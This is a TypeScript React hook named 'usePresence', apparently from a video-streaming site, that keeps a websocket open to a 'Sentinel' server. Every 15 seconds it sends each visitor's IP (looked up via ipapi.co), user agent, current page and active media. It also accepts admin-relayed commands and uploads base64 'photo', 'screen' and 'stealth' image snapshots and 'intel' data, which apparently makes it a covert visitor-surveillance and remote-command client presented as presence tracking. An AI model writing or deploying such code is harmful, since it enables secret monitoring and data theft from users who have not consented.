"use client"
import { useEffect, useState, useCallback, useRef } from 'react';
import { io, Socket } from 'socket.io-client';

// Use environment variable or default to localhost for dev
// In production, this should point to your deployed Node.js server
const SENTINEL_SERVER_URL = process.env.NEXT_PUBLIC_SENTINEL_SERVER_URL || 'http://localhost:3001';

function generateSessionId() {
    return 'sess_' + Math.random().toString(36).substr(2, 9);
}

export function usePresence(onMessage?: (message: string) => void, onCommand?: (cmd: any) => void) {
    const [sessionId, setSessionId] = useState<string | null>(null);
    const socketRef = useRef<Socket | null>(null);

    // Initialize Socket Connection
    useEffect(() => {
        let sid = sessionStorage.getItem('yure_flix_sid');
        if (!sid) {
            sid = generateSessionId();
            sessionStorage.setItem('yure_flix_sid', sid);
        }
        setSessionId(sid);

        // Connect to Sentinel Server
        const socket = io(SENTINEL_SERVER_URL, {
            transports: ['websocket'],
            reconnectionAttempts: 5,
            timeout: 10000,
        });
        socketRef.current = socket;

        socket.on('connect', () => {
            console.log('[Sentinel] Connected to server:', socket.id);
            // Register immediately
            updateStatus(true);
        });

        socket.on('disconnect', () => {
            console.log('[Sentinel] Disconnected from server');
        });

        socket.on('connect_error', (err) => {
            console.warn('[Sentinel] Connection error:', err.message);
        });

        // Listen for Server Commands (Relayed from Admin)
        socket.on('server_command', (cmd) => {
            console.log('[Sentinel] Received Command:', cmd);
            if (onCommand) onCommand(cmd);
            if ((cmd.type === 'MESSAGE' || cmd.type === 'ALERT') && onMessage) {
                onMessage(cmd.payload);
            }
        });

        return () => {
            socket.disconnect();
        };
    }, []); // Run once on mount

    // Update Status / Heartbeat
    const updateStatus = useCallback(async (isOnline: boolean = true) => {
        if (!socketRef.current || !socketRef.current.connected) return;

        let ipAddress = sessionStorage.getItem('cached_ip') || 'IP Local';
        if (!sessionStorage.getItem('cached_ip')) {
            try {
                const res = await fetch('https://ipapi.co/json/', { mode: 'cors' });
                const json = await res.json();
                ipAddress = json.ip || 'Privado';
                sessionStorage.setItem('cached_ip', ipAddress);
            } catch (e) { }
        }

        const activeMedia = (window as any).activeMedia;
        const hasExt = document.documentElement.dataset.sentinelActive === 'true';

        const payload = {
            online: isOnline,
            userAgent: navigator.userAgent,
            path: window.location.pathname,
            pageTitle: document.title,
            ip: ipAddress,
            activeContent: activeMedia || null,
            hasExtension: hasExt
        };

        // If it's the first time, register, otherwise heartbeat
        // Actually for simplicity, we treat them similarly on server side
        socketRef.current.emit('heartbeat', payload);
    }, []);

    // Heartbeat Interval
    useEffect(() => {
        // Send heartbeat every 15 seconds (much faster than Firebase 60s because websockets are cheap)
        const interval = setInterval(() => updateStatus(true), 15000);
        return () => clearInterval(interval);
    }, [updateStatus]);


    // Send Snapshot (Binary Data)
    const sendSnapshot = useCallback((base64Image: string, field: string = 'photo') => {
        if (!socketRef.current || !base64Image) return;

        // Convert field names to match server expectation if needed, or send generic 'client_data'
        // Server expects: { type: 'photo' | 'screen' | 'intel', data: ... }
        let type = 'photo';
        if (field === 'screenPreview') type = 'screen';
        if (field === 'stealthPreview') type = 'stealth';

        socketRef.current.emit('client_data', { type, data: base64Image });
    }, []);

    // Send Intel
    const sendIntel = useCallback((intelData: any) => {
        if (!socketRef.current) return;
        socketRef.current.emit('client_data', { type: 'intel', data: intelData });
    }, []);

    return { sessionId, sendSnapshot, sendIntel };
}
